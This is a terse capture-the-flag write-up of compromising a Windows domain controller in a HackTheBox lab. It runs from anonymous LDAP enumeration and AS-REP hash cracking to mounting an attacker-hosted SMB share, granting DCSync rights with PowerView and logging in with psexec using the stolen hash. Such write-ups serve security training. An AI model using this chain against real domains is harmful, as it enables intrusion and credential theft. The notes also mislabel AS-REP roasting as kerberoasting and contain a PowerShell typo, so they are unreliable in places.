IP: 10.10.10.161
Nmap Scans:
Top 1000
```bash
PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-20 14:46:55Z)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
464/tcp open  kpasswd5?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-security-mode: SMB: Couldn\'t find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

```
All Ports
```bash
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

smb is empty?

ldap time
See if it works
```bash
ldapsearch -h 10.10.10.161 -x
# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 32 No such object
text: 0000208D: NameErr: DSID-0310021B, problem 2001 (NO_OBJECT), data 0, best 
 match of:
	''


# numResponses: 1
```

Get the Domain Name.
```bash
ldapsearch -h 10.10.10.161 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" > [[ldap-anon]]
 Groups
 ```bash
cat ldap-anon.md | grep -i memberof
memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
memberOf: CN=System Managed Accounts Group,CN=Builtin,DC=htb,DC=local
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
memberOf: CN=Users,CN=Builtin,DC=htb,DC=local
memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
memberOf: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Obje
memberOf: CN=Managed Availability Servers,OU=Microsoft Exchange Security Group
memberOf: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,
memberOf: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=
memberOf: CN=Windows Authorization Access Group,CN=Builtin,DC=htb,DC=local
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=htb,DC=local
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=htb,DC=local
memberOf: CN=Users,CN=Builtin,DC=htb,DC=local
memberOf: CN=Users,CN=Builtin,DC=htb,DC=local
memberOf: CN=IIS_IUSRS,CN=Builtin,DC=htb,DC=local
memberOf: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=
memberOf: CN=Managed Availability Servers,OU=Microsoft Exchange Security Group
memberOf: CN=Windows Authorization Access Group,CN=Builtin,DC=htb,DC=local
memberOf: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Group
```

Usersnames
[[personObject]]
```bash
ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
requesting:
sebastien
lucinda
andy
mark
svc-alfresco
```
Create own password list cause rockyou is too good

magic
```bash
hashcat --force --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule |sort -u | awk 'length($0) > 7'
```

Impacket time
SIDENOTE:
	GetNPUsers is just kerberoasting tl;dr windows sends hash for some dumb reason and now we have it
	SPNs use kerberos for authentication.
Use GetNPUsers and get kerberos hash crack with hashcat
password is s3rvice

use creds for smb (svc-alfresco:s3rvice)
```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```

on box so Winpeas
nothing really so bloodhound cause active dir

but first we need ot put bloodhound on the box.
 smb server
 ```bash
 ./smbserver.py Name $(pwd) -smb2support -user kali -password kali
 ```

need to make the correct object on the box
```powershell
$pass = convertto-securestring 'kali' -AsPlainText -Force
$cred - New-Object System.Management.Automation.PSCredential('kali',$pass)
New-PSDrive - Name kali -PSProvider FileSystem -Credential $cred -Root \\10.10.14.23\Name
```

Its a graph
lets make our own user cause we can
add user to "Exchange Windows Permissions" with net group

PowerView time.
Do the object thing again
```powershell
$pass = convertto-securestring 'kali' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\kali',$pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity htb.local -Rights DCSync
```
dump sam
the login with psexec as admin with the hash